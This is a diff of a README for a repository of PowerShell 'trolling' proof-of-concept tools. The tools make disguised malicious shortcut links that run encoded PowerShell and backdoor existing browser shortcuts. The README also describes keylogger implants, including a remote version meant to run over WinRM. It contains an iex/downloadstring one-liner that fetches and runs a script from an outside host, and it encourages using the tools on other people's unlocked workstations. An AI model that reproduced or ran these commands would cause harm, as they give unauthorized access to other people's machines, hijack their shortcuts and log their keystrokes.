@@ -1,21 +1,21 @@
 # trollsrc
 PoCs to share for trolling
 
-.\make-shortcut.ps1 will assist in generating malicious shortcut links (chrome Icon by default)
+These tools are intended to be used in a well-configured windows environment that allows for some user-level powershell execution.
+Have a problem with admins leaving their workstations unlocked? Teach them a lesson by performing a benign backdoor on their primary web browser and wait :D
 
-It will take arbitrary powershell 1 liners as an argument to base64 encode and execute when the icon is clicked
+## .\make-shortcut.ps1
+* Generates malicious shortcut links (chrome Icon mimicked by default)
+* Takes powershell 1 liners as an argument; base64 encodes and executes payload when the icon is clicked
 
+## .\bd-lnk.ps1 
+* Takes a shortcut path as an argument; backdoors it with a troll message payload
+* it will backdoor the link with a powershell troll msg and then redirect execution to the original application
+* this will copy the source icon to $env:homepath\trollz\linkbackup\$foo.lnk for restoration
+* .\bd-lnk.ps1 -sourcepath "$env:homepath\desktop\google chrome.lnk" 
 
-
-.\bd-lnk.ps1 will take an executable shortcut as an argument, and backdoor with a troll message payload
-
-.\bd-lnk.ps1 -sourcepath "$env:homepath\desktop\google chrome.lnk" 
-
-this will copy the icon to $env:homepath\trollz\linkbackup\google chrome.lnk for restoration
-
-it will backdoor the link with a troll msg and then redirect execution to the origional application
-
-
-iex (new-object system.net.webclient).downloadstring("https://raw.githubusercontent.com/pooki3bear/trollsrc/master/keyimp.ps1")
-
-At an unattended workstation loads up a keylogger that pops calc.exe anytime 'c' is pressed
+## .\keyimp.ps1
+* keyimp-ri.ps1 is intended for REMOTE implants, i.e. this can be run on a system via WinRM 
+* keyimp.ps1 and simple-keyimp.ps1 are intended to be loaded from the target user session (unlocked workstation)
+* loads up a keylogger that pops calc.exe anytime 'c' is pressed
+* iex (new-object system.net.webclient).downloadstring("https://raw.githubusercontent.com/pooki3bear/trollsrc/master/keyimp.ps1")
